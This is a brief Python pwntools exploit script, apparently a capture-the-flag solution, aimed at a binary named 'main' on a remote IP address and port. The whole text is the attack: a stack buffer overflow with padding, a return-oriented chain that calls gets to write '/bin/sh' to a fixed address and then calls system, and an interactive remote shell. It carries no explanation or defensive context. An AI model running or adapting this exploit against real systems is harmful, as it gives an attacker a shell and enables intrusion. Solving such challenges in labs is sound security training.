from pwn import*
p = remote('124.156.121.112',28021)
elf =ELF('./main')
pop_rdi_ret = 0x400733
payload = 'U'*0x2A0 + 'U'*8 + p64(pop_rdi_ret) + p64(0x601060) + p64(elf.plt['gets'])  + p64(pop_rdi_ret) + p64(0x601060) + p64(elf.plt['system'])
p.sendline(payload)
p.sendline('/bin/sh\x00')
p.interactive()
